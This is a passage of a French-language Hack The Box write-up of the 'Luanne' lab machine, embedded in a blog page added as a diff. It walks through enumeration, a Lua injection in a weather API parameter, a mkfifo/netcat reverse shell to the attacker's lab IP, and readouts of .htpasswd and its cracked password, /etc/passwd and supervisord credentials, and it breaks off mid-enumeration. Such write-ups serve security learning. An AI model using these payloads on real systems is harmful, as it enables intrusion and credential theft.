@@ -1,0 +1,956 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Luanne &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Luanne - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Luanne">
+    <meta itemprop="description" content="Hack The Box - Luanne - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Luanne">
+    <meta property="og:description" content="Hack The Box - Luanne - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/luanne/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/luanne/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/luanne/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/luanne/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/luanne/">
+            Hack The Box - Luanne
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-04-02</span>
+            
+        
+
+        
+            
+                <span class="readingTime">17 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/other/">other</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/luanne/luanne-fiche.png" alt=""></p>
+<p>Luanne est une <a href="https://app.hackthebox.eu/machines/Luanne">machine</a> easy qui a été déployée sur Hack The Box le dimanche 28 novembre et créé par <strong>@polarbearer</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#scan-nmap">Scan Nmap</a></li>
+            <li><a href="#enumération-web">Enumération web</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#première-connexion">Première connexion</a>
+      <ul>
+        <li><a href="#language-lua-et-reverse-shell-netbsd">Language Lua et reverse shell NetBSD</a></li>
+        <li><a href="#utilisateur-httpd">Utilisateur httpd</a></li>
+        <li><a href="#clé-privée-rsa-de-rmichaels">Clé privée RSA de r.michaels</a></li>
+        <li><a href="#connexion-en-ssh---rmichaels">Connexion en SSH - r.michaels</a></li>
+      </ul>
+    </li>
+    <li><a href="#élévation-de-privilèges">Élévation de privilèges</a>
+      <ul>
+        <li><a href="#commande-doas-et-root">Commande doas et root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h4 id="scan-nmap">Scan Nmap</h4>
+<pre><code>$ nmap -sC -sV -p- -T4 10.10.10.218
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey:
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+| http-robots.txt: 1 disallowed entry
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+</code></pre><p>On retrouve :</p>
+<ul>
+<li>un service <code>ssh/22</code></li>
+<li>un service <code>http/80</code> sous <code>nginx 1.19.0</code></li>
+<li>un service <code>http-medusa/9001</code></li>
+<li>l&rsquo;OS de la machine est une NetBSD</li>
+</ul>
+<p>Quand on essaye d&rsquo;accéder au site web sur le port 80, on tombe sur une page d&rsquo;authentification.</p>
+<p><img src="/img/luanne/luanne-auth.png" alt=""></p>
+<p>Et quand je clique sur <code>Cancel</code> je tombe sur cette page.</p>
+<p><img src="/img/luanne/luanne-cancel.png" alt=""></p>
+<h4 id="enumération-web">Enumération web</h4>
+<p>En utilisant gobuster, je trouve deux répertoires.</p>
+<pre><code>gobuster -u http://luanne.htb -w /home/luks/infosec/tools/SecLists/Discovery/Web-Content/common.txt
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://luanne.htb/
+[+] Threads      : 10
+[+] Wordlist     : /home/luks/infosec/tools/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2021/03/21 00:53:55 Starting gobuster
+=====================================================
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+=====================================================
+2021/03/21 00:54:05 Finished
+=====================================================
+</code></pre><p>index.html représente la page d&rsquo;accueil d&rsquo;nginx et robots.txt indique que le répertoire <code>/weather</code> est désactivé, mais qu&rsquo;il recueille toujours des requêtes sur des villes. Si je vais dessus, je tombe sur une page 404.</p>
+<p><img src="/img/luanne/luanne-robots.png" alt=""></p>
+<p>Continuons l&rsquo;énumération avec gobuster à partir de <code>http://luanne.htb/weather</code>.</p>
+<p>L&rsquo;analyse gobuster révèle un autre répertoire sous <code>/forecast</code>.</p>
+<pre><code>gobuster -u http://luanne.htb/weather -w /home/luks/infosec/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://luanne.htb/weather/
+[+] Threads      : 10
+[+] Wordlist     : /home/luks/infosec/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2021/03/21 01:00:18 Starting gobuster
+=====================================================
+/forecast (Status: 200)
+=====================================================
+2021/03/21 01:08:38 Finished
+=====================================================
+</code></pre><p>Si je vais dessus je tombe sur un message qui indique qu&rsquo;il n&rsquo;y a pas de ville de spécifier et d&rsquo;utiliser l&rsquo;input <code>city=list</code> pour lister celles disponibles.</p>
+<p><img src="/img/luanne/luanne-city.png" alt=""></p>
+<p>J&rsquo;ai d&rsquo;abord essayé avec <code>Lille</code> pour voir le résultat puis j&rsquo;ai utilisé <code>list</code>.</p>
+<p><img src="/img/luanne/luanne-lille.png" alt=""></p>
+<p><img src="/img/luanne/luanne-list.png" alt=""></p>
+<p>Quand j&rsquo;utilise une ville de la liste ici <code>Manchester</code>, j&rsquo;ai un resultat en <code>JSON</code>. On peut donc potentiellement intéragir directement avec le backend à partir de cet input.
+En interceptant la requête avec <code>burp</code>, j&rsquo;arrive à provoquer une <code>erreur Lua</code>.</p>
+<p><img src="/img/luanne/luanne-burp.png" alt=""></p>
+<h2 id="première-connexion">Première connexion</h2>
+<h3 id="language-lua-et-reverse-shell-netbsd">Language Lua et reverse shell NetBSD</h3>
+<p><a href="https://fr.wikipedia.org/wiki/Lua">Lua</a> est un langage de script libre écrit en C et conçu afin d&rsquo;être embarqué dans d&rsquo;autres applications. On a donc un OS sous <code>NetBSD</code> et un backend en Lua. En recherchant <code>NetBSD reverse shell</code>, je tombe sur <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd">le repo PayloadsAllTheThings de swissky</a> qui donne un reverse shell Netcat OpenBSD. En cherchant en parallèle <code>reverse shell Lua</code>, je trouve sur <code>GTFOBins</code> un <a href="https://gtfobins.github.io/gtfobins/lua/">shell</a> Lua, ou on voit que pour faire une commande système on utilise <a href="http://gurau-audibert.hd.free.fr/josdblog/2014/04/lua-executer-une-commande-systeme/">os.execute</a>.</p>
+<p>En utilisant le payload <code>Manchester');os.execute('pwd')--</code>, j&rsquo;arrive à exécuter des commandes systèmes.</p>
+<p><code>A comment starts anywhere with a double hyphen (--) and runs until the end of the line. Lua also offers block comments, which start with --[[ and run until the corresponding ]]. A common trick, when we want to comment out a piece of code.</code></p>
+<p><a href="https://www.lua.org/pil/1.3.html">Source</a></p>
+<p><img src="/img/luanne/luanne-pwd.png" alt=""></p>
+<p>Le payload sera un mix des deux <code>http://10.10.10.218/weather/forecast?city=Manchester');os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.241 1337 &gt;/tmp/f&quot;)--</code>, j&rsquo;ouvre un listener sur le port 1337, j&rsquo;encode l&rsquo;url et je tente un curl.</p>
+<p>Payload :
+<code>http://10.10.10.218/weather/forecast?city=Manchester%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.241%201337%20%3E%2Ftmp%2Ff%22%29--</code></p>
+<p><img src="/img/luanne/luanne-httpd.png" alt=""></p>
+<h3 id="utilisateur-httpd">Utilisateur httpd</h3>
+<p>Je récupère un shell en tant qu'<code>httpd</code>. On trouve un fichier <code>.htpasswd</code> qui contient un utilisateur et son hash <code>webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0</code>.</p>
+<pre><code>$ ls
+index.html
+robots.txt
+$ ls -la
+total 20
+drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
+drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
+-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
+-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
+-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
+$ cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+</code></pre><p>Utilisation de <code>hashcat</code> pour cracker le hash, on retrouve le couple <code>webapi_user:iamthebest</code>.</p>
+<pre><code>$hashcat -m 500 test /usr/share/wordlists/rockyou.txt --show
+$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
+</code></pre><p>Je retrouve également la liste des utilisateurs avec la commande <code>/etc/passwd</code> et notamment <code>r.michaels</code>.</p>
+<pre><code>$ cat /etc/passwd
+root:*:0:0:Charlie &amp;:/root:/bin/sh
+toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
+daemon:*:1:1:The devil himself:/:/sbin/nologin
+operator:*:2:5:System &amp;:/usr/guest/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+games:*:7:13:&amp; pseudo-user:/usr/games:/sbin/nologin
+postfix:*:12:12:&amp; pseudo-user:/var/spool/postfix:/sbin/nologin
+named:*:14:14:&amp; pseudo-user:/var/chroot/named:/sbin/nologin
+ntpd:*:15:15:&amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin
+sshd:*:16:16:&amp; pseudo-user:/var/chroot/sshd:/sbin/nologin
+_pflogd:*:18:18:&amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin
+_rwhod:*:19:19:&amp; pseudo-user:/var/rwho:/sbin/nologin
+_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
+_timedc:*:22:22:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_sdpd:*:23:23:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_httpd:*:24:24:&amp; pseudo-user:/var/www:/sbin/nologin
+_mdnsd:*:25:25:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_tests:*:26:26:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_tcpdump:*:27:27:&amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin
+_tss:*:28:28:&amp; pseudo-user:/var/tpm:/sbin/nologin
+_rtadvd:*:30:30:&amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin
+_unbound:*:32:32:&amp; pseudo-user:/var/chroot/unbound:/sbin/nologin
+_nsd:*:33:33:&amp; pseudo-user:/var/chroot/nsd:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
+nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
+r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
+nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
+dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
+</code></pre><p>Si j&rsquo;essaye de me loguer avec les creds trouvé, je retrouve les APIs, mais rien de bien intéressant.</p>
+<p><img src="/img/luanne/luanne-80.png" alt=""></p>
+<p>L&rsquo;analyse nmap a montrée qu&rsquo;il y a un deuxième service qui utilise le port <code>9001</code>, mais si j&rsquo;essaye d&rsquo;aller dessus, je ne peux pas me loguer avec les creds <code>webapi_user:iamthebest</code>.</p>
+<p>A ce stade, j&rsquo;ai voulu déployer <code>linpeas</code>, mais je n&rsquo;ai pas réussi donc j&rsquo;ai énuméré la machine à la mano en commençant par <code>ps -aux</code></p>
+<pre><code>$ ps -aux           
+USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
+root           0  0.0  0.2      0 13048 ?     OKl  10:42PM 0:05.32 [system]
+root           1  0.0  0.0  21628  1520 ?     Is   10:42PM 0:00.02 init 
+root         163  0.0  0.0  32528  2300 ?     Ss   10:42PM 0:00.07 /usr/sbin/sy
+r.michaels   185  0.0  0.0  34996  2004 ?     Is   10:42PM 0:00.00 /usr/libexec
+_httpd       224  0.0  0.0  20032  1716 ?     I     2:00AM 0:00.00 sh -c rm  /t
+_httpd       225  0.0  0.0  15728  1284 ?     I     2:00AM 0:00.00 cat /tmp/f 
+root         298  0.0  0.0  19704  1336 ?     Is   10:42PM 0:00.00 /usr/sbin/po
+root         299  0.0  0.0  37204  1836 ?     Is   10:42PM 0:00.00 nginx: maste
+root         318  0.0  0.1 119748  7224 ?     Il   10:42PM 0:14.60 /usr/pkg/bin
+_httpd       336  0.0  0.3 118820 16596 ?     Ss   10:42PM 0:07.36 /usr/pkg/bin
+_httpd       345  0.0  0.0  19168  1276 ?     I     2:01AM 0:00.00 cat /tmp/f 
+root         348  0.0  0.0  71348  2920 ?     Is   10:42PM 0:00.02 /usr/sbin/ss
+nginx        373  0.0  0.1  37716  3264 ?     I    10:42PM 0:23.36 nginx: worke
+_httpd       376  0.0  0.0  34952  1984 ?     Is   10:42PM 0:00.06 /usr/libexec
+root         402  0.0  0.0  20220  1668 ?     Ss   10:42PM 0:00.05 /usr/sbin/cr
+_httpd       411  0.0  0.0  20020  1660 ?     S    10:42PM 0:00.26 /bin/sh /usr
+_httpd       422  0.0  0.0  19992  1656 ?     S    10:42PM 0:00.11 /bin/sh /usr
+_httpd       436  0.0  0.0  19988  1652 ?     S    10:42PM 0:00.10 /bin/sh /usr
+_httpd       536  0.0  0.0  24012  1704 ?     I     2:01AM 0:00.00 /bin/sh -i 
+_httpd       560  0.0  0.0  35252  2328 ?     I     2:01AM 0:00.00 /usr/libexec
+_httpd       571  0.0  0.0  35252  2328 ?     I     2:00AM 0:00.00 /usr/libexec
+_httpd       907  0.0  0.0  35252  2328 ?     I     2:13AM 0:00.00 /usr/libexec
+_httpd       991  0.0  0.0  20028  1720 ?     I     2:13AM 0:00.00 sh -c rm  /t
+_httpd      1439  0.0  0.0  35252  2328 ?     I     2:50AM 0:00.00 /usr/libexec
+_httpd      1566  0.0  0.0  20052  1764 ?     I     2:26AM 0:00.00 /bin/sh -i 
+_httpd      1621  0.0  0.0  15952  1400 ?     I     2:26AM 0:00.01 nc 10.10.14.
+_httpd      1989  0.0  0.0  20704  1716 ?     I     2:32AM 0:00.00 /bin/sh -i 
+_httpd      2068  0.0  0.0  16368  1396 ?     I     2:32AM 0:00.00 nc 10.10.14.
+_httpd      2243  0.0  0.0  20980  1712 ?     I     2:35AM 0:00.00 /bin/sh -i 
+_httpd      2257  0.0  0.0  20032  1712 ?     I     2:35AM 0:00.00 sh -c rm /tm
+_httpd      2311  0.0  0.0  15948  1396 ?     I     2:35AM 0:00.00 nc 10.10.14.
+_httpd      2644  0.0  0.0  17604  1400 ?     I     2:50AM 0:00.00 nc 10.10.14.
+_httpd      2819  0.0  0.0  15952  1396 ?     I     2:52AM 0:00.00 nc 127.0.0.1
+_httpd      3089  0.0  0.0  15436  1280 ?     S     3:59AM 0:00.00 cat /tmp/f 
+_httpd      3225  0.0  0.0  35252  2328 ?     I     3:54AM 0:00.00 /usr/libexec
+_httpd      3559  0.0  0.0  15948  1396 ?     I     3:58AM 0:00.00 nc -e /bin/s
+_httpd      3568  0.0  0.0  15436  1280 ?     I     3:54AM 0:00.00 cat /tmp/f 
+_httpd      3652  0.0  0.0  20028  1712 ?     I     3:59AM 0:00.00 sh -c rm /tm
+_httpd      3707  0.0  0.0  35252  2328 ?     I     3:59AM 0:00.00 /usr/libexec
+_httpd      4869  0.0  0.0  22392  1708 ?     I     3:54AM 0:00.00 sh -c rm /tm
+_httpd      4939  0.0  0.0  19888  1524 ?     O     4:20AM 0:00.00 ps -aux 
+_httpd      5298  0.0  0.0  20052  1708 ?     I     3:54AM 0:00.00 /bin/sh -i 
+_httpd      5436  0.0  0.0  16856  1400 ?     I     3:54AM 0:00.00 nc 10.10.14.
+_httpd      6500  0.0  0.0  17636  1388 ?     S     4:19AM 0:00.00 sleep 30 
+_httpd      9935  0.0  0.0  16032  1284 ?     I     1:56AM 0:00.00 cat /tmp/f 
+_httpd     10159  0.0  0.0  15948  1396 ?     I     2:01AM 0:00.00 nc 10.10.14.
+_httpd     10205  0.0  0.0  15948  1396 ?     I     1:56AM 0:00.00 nc 10.10.14.
+_httpd     10274  0.0  0.0  35252  2328 ?     I     1:56AM 0:00.00 /usr/libexec
+_httpd     10429  0.0  0.0  20032  1720 ?     I     2:01AM 0:00.00 sh -c rm  /t
+_httpd     10541  0.0  0.0  15952  1396 ?     I     2:13AM 0:00.00 nc 10.10.14.
+_httpd     10583  0.0  0.0  20028  1712 ?     I     1:56AM 0:00.00 sh -c rm  /t
+_httpd     10710  0.0  0.0  20040  1704 ?     I     1:56AM 0:00.00 /bin/sh -i 
+_httpd     10953  0.0  0.0  22424  1712 ?     I     2:26AM 0:00.00 sh -c rm /tm
+_httpd     10970  0.0  0.0  20052  1708 ?     I     2:00AM 0:00.00 /bin/sh -i 
+_httpd     11022  0.0  0.0  20052  1712 ?     I     2:13AM 0:00.00 /bin/sh -i 
+_httpd     11031  0.0  0.0  22308  1760 ?     I     2:50AM 0:00.00 /bin/sh -i 
+_httpd     11048  0.0  0.0  15436  1280 ?     I     2:13AM 0:00.00 cat /tmp/f 
+_httpd     11148  0.0  0.0  15952  1400 ?     I     2:00AM 0:00.00 nc 10.10.14.
+_httpd     11158  0.0  0.0  15440  1284 ?     I     2:50AM 0:00.00 cat /tmp/f 
+_httpd     11418  0.0  0.0  20028  1712 ?     I     2:50AM 0:00.00 sh -c rm /tm
+_httpd     11630  0.0  0.0  15436  1280 ?     I     2:26AM 0:00.00 cat /tmp/f 
+_httpd     11970  0.0  0.0  20028  1716 ?     I     2:32AM 0:00.00 sh -c rm /tm
+_httpd     12154  0.0  0.0  35252  2328 ?     I     2:26AM 0:00.00 /usr/libexec
+_httpd     12243  0.0  0.0  35252  2328 ?     I     2:32AM 0:00.00 /usr/libexec
+_httpd     12296  0.0  0.0  15436  1280 ?     I     2:35AM 0:00.00 cat /tmp/f 
+_httpd     12406  0.0  0.0  15436  1280 ?     I     2:32AM 0:00.00 cat /tmp/f 
+_httpd     12471  0.0  0.0  35252  2328 ?     I     2:35AM 0:00.00 /usr/libexec
+_httpd     14184  0.0  0.0  15948  1396 ?     S     3:59AM 0:00.01 nc 10.10.14.
+_httpd     15180  0.0  0.0  17640  1388 ?     S     4:19AM 0:00.00 sleep 30 
+_httpd     15251  0.0  0.0  20080  1716 ?     S     3:59AM 0:00.01 /bin/sh -i 
+_httpd     15657  0.0  0.0  18344  1384 ?     S     4:19AM 0:00.00 sleep 30 
+root         423  0.0  0.0  19780  1576 ttyE0 Is+  10:42PM 0:00.00 /usr/libexec
+root         421  0.0  0.0  19784  1584 ttyE1 Is+  10:42PM 0:00.00 /usr/libexec
+root         388  0.0  0.0  21276  1580 ttyE2 Is+  10:42PM 0:00.00 /usr/libexec
+root         433  0.0  0.0  19780  1584 ttyE3 Is+  10:42PM 0:00.00 /usr/libexec
+</code></pre><p>On peut voir que l&rsquo;utilisateur <code>r.michaels</code> utilise le processus <code>185</code> | <code>/usr/libexec</code>.</p>
+<p>Puis la commande <code>netstat -an</code> pour lister les connexions et les ports d&rsquo;écoute actifs.</p>
+<pre><code>$ netstat -an
+Active Internet connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        State
+tcp        0      0  10.10.10.218.65163     10.10.14.241.1337      ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65164        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65165     10.10.14.241.4444      CLOSE_WAIT
+tcp        0      0  10.10.10.218.65167     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65168        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65188     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65189        CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65191        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65192     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65193        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65194     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65195        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65198     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65199        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65200     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65201        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65202     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65203        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65206     10.10.14.241.1337      CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65207        CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
+tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
+tcp        0      0  *.80                   *.*                    LISTEN
+tcp        0      0  *.22                   *.*                    LISTEN
+tcp        0      0  *.9001                 *.*                    LISTEN
+Active Internet6 connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
+tcp6       0      0  *.22                   *.*                    LISTEN
+Active UNIX domain sockets
+Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr
+fffff82462b6b9e0 stream      0      0        0 fffff82462b6b890        0        0 
+fffff82462b6b890 stream      0      0        0 fffff82462b6b9e0        0        0 
+fffff82462b6b2e0 stream      0      0 fffff82511d78c08        0        0        0 /var/supervisord/run/supervisord.sock.340
+fffff82462b6be40 dgram       0      0        0 fffff82462b6b350        0 fffff82462b6b970 -&gt; /var/run/log
+fffff82462b6beb0 dgram       0      0        0 fffff82462b6b350        0 fffff82462b6be40 -&gt; /var/run/log
+fffff82462b6b970 dgram       0      0        0 fffff82462b6b350        0        0 -&gt; /var/run/log
+fffff82462b6b900 dgram       0      0        0        0        0        0 
+fffff82462b6b350 dgram       0      0 fffff824791b0040        0 fffff82462b6beb0        0 /var/run/log
+</code></pre><p>Plusieurs choses sont intéressantes :</p>
+<ul>
+<li>on retrouve un socket actif <code>/var/supervisord/run/supervisord.sock.340</code></li>
+<li>le port <code>3001</code> et en écoute sur la machine</li>
+</ul>
+<p>Je retrouve le fichier de conf du daemon en faisant un listing du répertoire <code>/etc</code>.</p>
+<pre><code>ls -la /etc/ | grep supervisor
+-rw-r--r--   1 root  wheel        1602 Nov 22 22:24 supervisord.conf
+</code></pre><p>Le fichier contient les identifiants <code>user:123</code> pour se connecter à l&rsquo;interface web sous le port <code>9001</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/supervisord.conf
+<span style="color:#f92672">[</span>unix_http_server<span style="color:#f92672">]</span>
+file<span style="color:#f92672">=</span>/var/supervisord/run/supervisord.sock      ; path to your socket file
+
+<span style="color:#f92672">[</span>inet_http_server<span style="color:#f92672">]</span>
+port <span style="color:#f92672">=</span> 0.0.0.0:9001
+username <span style="color:#f92672">=</span> user
+password <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span>
+
+<span style="color:#f92672">[</span>environment<span style="color:#f92672">]</span>
+TERM<span style="color:#f92672">=</span>tmux
+
+<span style="color:#f92672">[</span>supervisord<span style="color:#f92672">]</span>
+logfile<span style="color:#f92672">=</span>/dev/null                               ; supervisord log file
+pidfile<span style="color:#f92672">=</span>/var/supervisord/run/supervisord.pid    ; pidfile location
+minfds<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>                                     ; number of startup file descriptors
+minprocs<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>                                    ; number of process descriptors
+user<span style="color:#f92672">=</span>_httpd                                     ; default user
+
+<span style="color:#75715e">#[rpcinterface:supervisor]</span>
+<span style="color:#75715e">#supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</span>
+
+<span style="color:#f92672">[</span>supervisorctl<span style="color:#f92672">]</span>
+serverurl<span style="color:#f92672">=</span>unix:///tmp/supervisor.sock         ; use a unix:// URL  <span style="color:#66d9ef">for</span> a unix socket
+</code></pre></div><p>Ca fonctionne et je retrouve le nom du daemon <code>supervisor</code> indiqué précédemment lors de l&rsquo;énumération.</p>
+<p><img src="/img/luanne/luanne-supervisor.png" alt=""></p>
+<h3 id="clé-privée-rsa-de-rmichaels">Clé privée RSA de r.michaels</h3>
+<p><a href="http://supervisord.org/">Supervisor</a> est un système client/serveur qui permet aux utilisateurs de contrôler les processus sur les OS Unix.
+Je n&rsquo;ai pas trouvé de vuln en lien avec la version <code>4.2.0</code>. Après un tour sur l&rsquo;interface web, je clique sur <code>Tail -f Stdout</code> qui permet d&rsquo;afficher la dernière partie d&rsquo;un fichier et le param <code>-f</code> de boucler indéfiniment.</p>
+<p>On peut voir que l&rsquo;utilisateur <code>r.michaels</code> utilise une commande qui intéragit directement avec le port <code>3001</code> en localhost.</p>
+<p><img src="/img/luanne/luanne-3001.png" alt=""></p>
+<p>Si j&rsquo;effectue un <code>curl</code> sur <code>localhost:3001</code>, j&rsquo;obtiens un accès refusé.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl 127.0.0.1:3001
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
